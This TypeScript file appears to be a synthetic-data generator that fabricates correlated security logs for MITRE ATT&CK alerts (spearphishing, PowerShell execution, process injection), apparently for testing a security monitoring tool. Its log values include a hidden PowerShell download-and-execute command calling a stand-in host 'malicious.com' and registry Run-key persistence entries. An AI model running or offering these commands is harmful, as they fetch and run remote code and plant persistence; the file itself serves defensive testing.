import { faker } from '@faker-js/faker';
import { generateTimestamp } from '../utils/timestamp_utils';
import type { BaseCreateAlertsReturnType } from '../create_alerts';
import type { TimestampConfig } from '../utils/timestamp_utils';

export interface CorrelationConfig {
  hostName?: string;
  userName?: string;
  timestampConfig?: TimestampConfig;
  alertTimestamp?: string;
  logCount?: number; // Number of supporting logs to generate
}

export interface CorrelatedLogSet {
  alert: BaseCreateAlertsReturnType;
  supportingLogs: any[];
  attackNarrative: string;
}

/**
 * Log Correlation Engine - Links alerts with realistic source logs
 * 
 * This engine generates supporting logs that would realistically trigger
 * each type of security alert, creating believable attack scenarios.
 */
export class LogCorrelationEngine {
  
  /**
   * Generate correlated logs for a MITRE T1566.001 (Spearphishing) alert
   */
  async generateSpearphishingCorrelation(config: CorrelationConfig): Promise<any[]> {
    const {
      hostName = faker.internet.domainName(),
      userName = faker.internet.username(),
      alertTimestamp = new Date().toISOString(),
      logCount = 8
    } = config;

    const baseTime = new Date(alertTimestamp);
    const logs: any[] = [];

    // 1. Email delivery log (30 minutes before alert)
    const emailTime = new Date(baseTime.getTime() - 30 * 60 * 1000);
    logs.push({
      '@timestamp': emailTime.toISOString(),
      'data_stream.dataset': 'microsoft.exchange',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'message-delivered',
      'event.category': ['email'],
      'event.outcome': 'success',
      'email.from.address': faker.internet.email({ provider: 'suspicious-domain.com' }),
      'email.to.address': `${userName}@company.com`,
      'email.subject': 'Urgent: Invoice Payment Required',
      'email.attachments': [{
        'file.name': 'invoice_2025.pdf.exe',
        'file.extension': 'exe',
        'file.size': 2048576
      }],
      'host.name': 'mail-server-01',
      'user.name': userName,
      'related.user': [userName],
      'threat.indicator.email.domain': 'suspicious-domain.com'
    });

    // 2. User opened email (25 minutes before alert)
    const emailOpenTime = new Date(baseTime.getTime() - 25 * 60 * 1000);
    logs.push({
      '@timestamp': emailOpenTime.toISOString(),
      'data_stream.dataset': 'microsoft.outlook',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'email-opened',
      'event.category': ['email'],
      'email.subject': 'Urgent: Invoice Payment Required',
      'host.name': hostName,
      'user.name': userName,
      'user_agent.original': 'Microsoft Outlook 16.0',
      'related.user': [userName]
    });

    // 3. File download from email (20 minutes before alert)
    const downloadTime = new Date(baseTime.getTime() - 20 * 60 * 1000);
    logs.push({
      '@timestamp': downloadTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.file',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'creation',
      'event.category': ['file'],
      'file.name': 'invoice_2025.pdf.exe',
      'file.path': `C:\\Users\\${userName}\\Downloads\\invoice_2025.pdf.exe`,
      'file.size': 2048576,
      'file.hash.md5': faker.string.hexadecimal({ length: 32, casing: 'lower' }),
      'file.hash.sha256': faker.string.hexadecimal({ length: 64, casing: 'lower' }),
      'host.name': hostName,
      'process.name': 'outlook.exe',
      'process.pid': faker.number.int({ min: 2000, max: 8000 }),
      'user.name': userName,
      'related.user': [userName],
      'related.hash': [faker.string.hexadecimal({ length: 32, casing: 'lower' })]
    });

    // 4. User executed the malicious file (15 minutes before alert)
    const executionTime = new Date(baseTime.getTime() - 15 * 60 * 1000);
    logs.push({
      '@timestamp': executionTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.process',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'start',
      'event.category': ['process'],
      'process.name': 'invoice_2025.pdf.exe',
      'process.command_line': `C:\\Users\\${userName}\\Downloads\\invoice_2025.pdf.exe`,
      'process.executable': `C:\\Users\\${userName}\\Downloads\\invoice_2025.pdf.exe`,
      'process.pid': faker.number.int({ min: 8000, max: 15000 }),
      'process.ppid': faker.number.int({ min: 2000, max: 8000 }),
      'process.parent.name': 'explorer.exe',
      'host.name': hostName,
      'user.name': userName,
      'related.user': [userName]
    });

    // 5. Malicious network connection (10 minutes before alert)
    const networkTime = new Date(baseTime.getTime() - 10 * 60 * 1000);
    const maliciousIP = '185.220.101.47'; // Known malicious IP range
    logs.push({
      '@timestamp': networkTime.toISOString(),
      'data_stream.dataset': 'network.flows',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'network_flow',
      'event.category': ['network'],
      'source.ip': faker.internet.ip(),
      'source.port': faker.internet.port(),
      'destination.ip': maliciousIP,
      'destination.port': 443,
      'network.protocol': 'tcp',
      'network.bytes': 15360,
      'host.name': hostName,
      'process.name': 'invoice_2025.pdf.exe',
      'process.pid': faker.number.int({ min: 8000, max: 15000 }),
      'user.name': userName,
      'related.ip': [maliciousIP],
      'related.user': [userName]
    });

    // 6. Registry modification (8 minutes before alert)
    const registryTime = new Date(baseTime.getTime() - 8 * 60 * 1000);
    logs.push({
      '@timestamp': registryTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.registry',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'modification',
      'event.category': ['registry'],
      'registry.key': 'HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
      'registry.value': 'WindowsUpdate',
      'registry.data.strings': [`C:\\Users\\${userName}\\AppData\\Local\\Temp\\winupdate.exe`],
      'host.name': hostName,
      'process.name': 'invoice_2025.pdf.exe',
      'process.pid': faker.number.int({ min: 8000, max: 15000 }),
      'user.name': userName,
      'related.user': [userName]
    });

    // 7. Credential harvesting attempt (5 minutes before alert)
    const credTime = new Date(baseTime.getTime() - 5 * 60 * 1000);
    logs.push({
      '@timestamp': credTime.toISOString(),
      'data_stream.dataset': 'security.security',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'credential-access',
      'event.category': ['authentication'],
      'event.outcome': 'failure',
      'winlog.event_id': 4625,
      'winlog.channel': 'Security',
      'message': 'An account failed to log on due to credential dumping attempt',
      'host.name': hostName,
      'process.name': 'invoice_2025.pdf.exe',
      'process.pid': faker.number.int({ min: 8000, max: 15000 }),
      'user.name': userName,
      'user.target.name': 'Administrator',
      'related.user': [userName, 'Administrator']
    });

    // 8. Windows Defender detection (triggering the alert)
    const detectionTime = new Date(baseTime.getTime() - 2 * 60 * 1000);
    logs.push({
      '@timestamp': detectionTime.toISOString(),
      'data_stream.dataset': 'endpoint.alerts',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'malware-detected',
      'event.category': ['malware'],
      'event.severity': 4,
      'threat.software.family': 'TrickBot',
      'threat.software.name': 'TrickBot Variant',
      'file.name': 'invoice_2025.pdf.exe',
      'file.hash.md5': faker.string.hexadecimal({ length: 32, casing: 'lower' }),
      'host.name': hostName,
      'process.name': 'invoice_2025.pdf.exe',
      'process.pid': faker.number.int({ min: 8000, max: 15000 }),
      'user.name': userName,
      'rule.name': 'Windows Defender: TrickBot Detection',
      'related.user': [userName],
      'related.hash': [faker.string.hexadecimal({ length: 32, casing: 'lower' })]
    });

    return logs.slice(0, logCount);
  }

  /**
   * Generate correlated logs for a MITRE T1059 (Command and Scripting) alert
   */
  async generateCommandScriptingCorrelation(config: CorrelationConfig): Promise<any[]> {
    const {
      hostName = faker.internet.domainName(),
      userName = faker.internet.username(),
      alertTimestamp = new Date().toISOString(),
      logCount = 6
    } = config;

    const baseTime = new Date(alertTimestamp);
    const logs: any[] = [];

    // 1. Initial PowerShell execution
    const psTime = new Date(baseTime.getTime() - 10 * 60 * 1000);
    logs.push({
      '@timestamp': psTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.process',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'start',
      'event.category': ['process'],
      'process.name': 'powershell.exe',
      'process.command_line': 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.com/script.ps1\')"',
      'process.executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      'process.pid': faker.number.int({ min: 5000, max: 10000 }),
      'process.ppid': faker.number.int({ min: 2000, max: 5000 }),
      'process.parent.name': 'cmd.exe',
      'host.name': hostName,
      'user.name': userName,
      'related.user': [userName]
    });

    // 2. Outbound network connection
    const networkTime = new Date(baseTime.getTime() - 8 * 60 * 1000);
    logs.push({
      '@timestamp': networkTime.toISOString(),
      'data_stream.dataset': 'network.flows',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'network_flow',
      'event.category': ['network'],
      'source.ip': faker.internet.ip(),
      'source.port': faker.internet.port(),
      'destination.ip': '192.168.100.50',
      'destination.port': 80,
      'destination.domain': 'malicious.com',
      'network.protocol': 'tcp',
      'network.bytes': 4096,
      'host.name': hostName,
      'process.name': 'powershell.exe',
      'process.pid': faker.number.int({ min: 5000, max: 10000 }),
      'user.name': userName,
      'related.ip': ['192.168.100.50'],
      'related.user': [userName]
    });

    // 3. Script downloaded and executed
    const scriptTime = new Date(baseTime.getTime() - 6 * 60 * 1000);
    logs.push({
      '@timestamp': scriptTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.file',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'creation',
      'event.category': ['file'],
      'file.name': 'temp_script.ps1',
      'file.path': `C:\\Users\\${userName}\\AppData\\Local\\Temp\\temp_script.ps1`,
      'file.size': 8192,
      'file.extension': 'ps1',
      'host.name': hostName,
      'process.name': 'powershell.exe',
      'process.pid': faker.number.int({ min: 5000, max: 10000 }),
      'user.name': userName,
      'related.user': [userName]
    });

    // 4. Credential dumping attempt
    const dumpTime = new Date(baseTime.getTime() - 4 * 60 * 1000);
    logs.push({
      '@timestamp': dumpTime.toISOString(),
      'data_stream.dataset': 'security.security',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'credential-access',
      'event.category': ['authentication'],
      'winlog.event_id': 4648,
      'winlog.channel': 'Security',
      'message': 'A logon was attempted using explicit credentials',
      'host.name': hostName,
      'process.name': 'powershell.exe',
      'process.pid': faker.number.int({ min: 5000, max: 10000 }),
      'user.name': userName,
      'user.target.name': 'SYSTEM',
      'related.user': [userName, 'SYSTEM']
    });

    // 5. Persistence mechanism
    const persistTime = new Date(baseTime.getTime() - 2 * 60 * 1000);
    logs.push({
      '@timestamp': persistTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.registry',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'creation',
      'event.category': ['registry'],
      'registry.key': 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
      'registry.value': 'SystemUpdate',
      'registry.data.strings': ['powershell.exe -WindowStyle Hidden -File C:\\temp\\persist.ps1'],
      'host.name': hostName,
      'process.name': 'powershell.exe',
      'process.pid': faker.number.int({ min: 5000, max: 10000 }),
      'user.name': userName,
      'related.user': [userName]
    });

    // 6. Security alert triggered
    const alertTriggerTime = new Date(baseTime.getTime() - 1 * 60 * 1000);
    logs.push({
      '@timestamp': alertTriggerTime.toISOString(),
      'data_stream.dataset': 'endpoint.behavioral',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'behavioral-anomaly',
      'event.category': ['intrusion_detection'],
      'event.severity': 4,
      'ml.anomaly_score': 0.95,
      'ml.is_anomaly': true,
      'message': 'Suspicious PowerShell execution pattern detected',
      'host.name': hostName,
      'process.name': 'powershell.exe',
      'process.pid': faker.number.int({ min: 5000, max: 10000 }),
      'user.name': userName,
      'rule.name': 'Behavioral: Suspicious PowerShell Activity',
      'threat.technique.id': 'T1059.001',
      'threat.technique.name': 'PowerShell',
      'related.user': [userName]
    });

    return logs.slice(0, logCount);
  }

  /**
   * Generate correlated logs for a MITRE T1055 (Process Injection) alert
   */
  async generateProcessInjectionCorrelation(config: CorrelationConfig): Promise<any[]> {
    const {
      hostName = faker.internet.domainName(),
      userName = faker.internet.username(),
      alertTimestamp = new Date().toISOString(),
      logCount = 5
    } = config;

    const baseTime = new Date(alertTimestamp);
    const logs: any[] = [];
    const parentPid = faker.number.int({ min: 3000, max: 6000 });
    const maliciousPid = faker.number.int({ min: 6000, max: 9000 });
    const targetPid = faker.number.int({ min: 9000, max: 12000 });

    // 1. Malicious process starts
    const processStart = new Date(baseTime.getTime() - 12 * 60 * 1000);
    logs.push({
      '@timestamp': processStart.toISOString(),
      'data_stream.dataset': 'endpoint.events.process',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'start',
      'event.category': ['process'],
      'process.name': 'suspicious.exe',
      'process.command_line': `C:\\temp\\suspicious.exe -inject`,
      'process.executable': 'C:\\temp\\suspicious.exe',
      'process.pid': maliciousPid,
      'process.ppid': parentPid,
      'process.parent.name': 'explorer.exe',
      'host.name': hostName,
      'user.name': userName,
      'related.user': [userName]
    });

    // 2. Target process enumeration
    const enumTime = new Date(baseTime.getTime() - 8 * 60 * 1000);
    logs.push({
      '@timestamp': enumTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.api',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'api_call',
      'event.category': ['process'],
      'api.name': 'CreateToolhelp32Snapshot',
      'api.parameters': 'TH32CS_SNAPPROCESS',
      'host.name': hostName,
      'process.name': 'suspicious.exe',
      'process.pid': maliciousPid,
      'user.name': userName,
      'related.user': [userName]
    });

    // 3. Target process opened
    const openTime = new Date(baseTime.getTime() - 6 * 60 * 1000);
    logs.push({
      '@timestamp': openTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.api',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'api_call',
      'event.category': ['process'],
      'api.name': 'OpenProcess',
      'api.parameters': `PROCESS_ALL_ACCESS, PID=${targetPid}`,
      'Target.process.name': 'notepad.exe',
      'Target.process.pid': targetPid,
      'host.name': hostName,
      'process.name': 'suspicious.exe',
      'process.pid': maliciousPid,
      'user.name': userName,
      'related.user': [userName]
    });

    // 4. Memory allocation in target
    const allocTime = new Date(baseTime.getTime() - 4 * 60 * 1000);
    logs.push({
      '@timestamp': allocTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.api',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'api_call',
      'event.category': ['process'],
      'api.name': 'VirtualAllocEx',
      'api.parameters': 'MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE',
      'memory.region.size': 4096,
      'memory.region.protection': 'PAGE_EXECUTE_READWRITE',
      'Target.process.name': 'notepad.exe',
      'Target.process.pid': targetPid,
      'host.name': hostName,
      'process.name': 'suspicious.exe',
      'process.pid': maliciousPid,
      'user.name': userName,
      'related.user': [userName]
    });

    // 5. Code injection detected
    const injectionTime = new Date(baseTime.getTime() - 2 * 60 * 1000);
    logs.push({
      '@timestamp': injectionTime.toISOString(),
      'data_stream.dataset': 'endpoint.events.security',
      'data_stream.namespace': 'default',
      'data_stream.type': 'logs',
      'event.action': 'process-injection',
      'event.category': ['intrusion_detection'],
      'event.severity': 4,
      'message': 'Process injection detected via CreateRemoteThread',
      'injection.technique': 'CreateRemoteThread',
      'Target.process.name': 'notepad.exe',
      'Target.process.pid': targetPid,
      'host.name': hostName,
      'process.name': 'suspicious.exe',
      'process.pid': maliciousPid,
      'user.name': userName,
      'rule.name': 'Process Injection Detection',
      'threat.technique.id': 'T1055',
      'threat.technique.name': 'Process Injection',
      'related.user': [userName]
    });

    return logs.slice(0, logCount);
  }

  /**
   * Main correlation function - determines attack type and generates appropriate logs
   */
  async generateCorrelatedLogs(
    alert: BaseCreateAlertsReturnType, 
    config: CorrelationConfig = {}
  ): Promise<any[]> {
    // Extract MITRE technique from alert if available
    const alertAny = alert as any;
    const mitreTechnique = alertAny['threat.technique.id'] || 
                          alertAny['threat.technique.id']?.[0] || 
                          'T1059'; // Default to command execution

    // Extract alert metadata
    const correlationConfig: CorrelationConfig = {
      hostName: alert['host.name'],
      userName: alert['user.name'],
      alertTimestamp: alert['@timestamp'],
      logCount: config.logCount || 6,
      ...config
    };

    // Route to appropriate correlation generator based on MITRE technique
    switch (mitreTechnique) {
      case 'T1566':
      case 'T1566.001':
        return this.generateSpearphishingCorrelation(correlationConfig);
      
      case 'T1059':
      case 'T1059.001':
        return this.generateCommandScriptingCorrelation(correlationConfig);
      
      case 'T1055':
      case 'T1055.001':
        return this.generateProcessInjectionCorrelation(correlationConfig);
      
      default:
        // Generic correlation for unknown techniques
        return this.generateCommandScriptingCorrelation(correlationConfig);
    }
  }

  /**
   * Generate a complete correlated attack scenario
   */
  async generateAttackScenario(
    alert: BaseCreateAlertsReturnType,
    config: CorrelationConfig = {}
  ): Promise<CorrelatedLogSet> {
    const supportingLogs = await this.generateCorrelatedLogs(alert, config);
    
    const alertAny = alert as any;
    const mitreTechnique = alertAny['threat.technique.id'] || 
                          alertAny['threat.technique.id']?.[0] || 
                          'T1059';

    // Generate attack narrative based on technique
    const narratives: Record<string, string> = {
      'T1566': 'Spearphishing attack detected: Malicious email delivered → User opened attachment → Malware executed → Network communication → Persistence established → Alert triggered',
      'T1566.001': 'Spearphishing attachment attack: Email with malicious attachment → User execution → System compromise → Credential harvesting → Detection',
      'T1059': 'Command and scripting attack: PowerShell execution → Remote script download → Credential dumping → Persistence mechanism → Behavioral detection',
      'T1059.001': 'PowerShell attack chain: Obfuscated script execution → Network communication → System manipulation → Registry modification → Alert generated',
      'T1055': 'Process injection attack: Malicious process started → Target enumeration → Process opened → Memory allocated → Code injected → Detection triggered'
    };

    const attackNarrative = narratives[mitreTechnique] || 
      'Generic attack detected: Initial access → Execution → Persistence → Discovery → Collection → Alert triggered';

    return {
      alert,
      supportingLogs,
      attackNarrative
    };
  }
}